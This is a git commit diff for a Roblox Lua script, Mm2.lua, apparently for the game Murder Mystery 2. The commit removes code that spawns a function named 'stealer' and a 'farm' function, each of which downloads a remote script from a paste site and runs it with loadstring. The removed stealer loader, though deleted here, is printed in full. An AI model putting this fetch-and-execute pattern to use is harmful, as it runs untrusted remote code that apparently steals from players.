3987a215abf1244393343b21e723adf348bda5af
RoshiroGaming32 <basiliojerico37@gmail.com>
2025-08-23 20:56:27 +0800

    Update Mm2.lua

--- Mm2.lua
+++ Mm2.lua
@@ -1,9 +1,1 @@
-local function stealer()
-   loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/QSt6xCnuLjgr38l5/raw", true))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://pastebin.com/raw/Ea2fXndi"))()
-end
 
-task.spawn(stealer)
-task.spawn(farm)
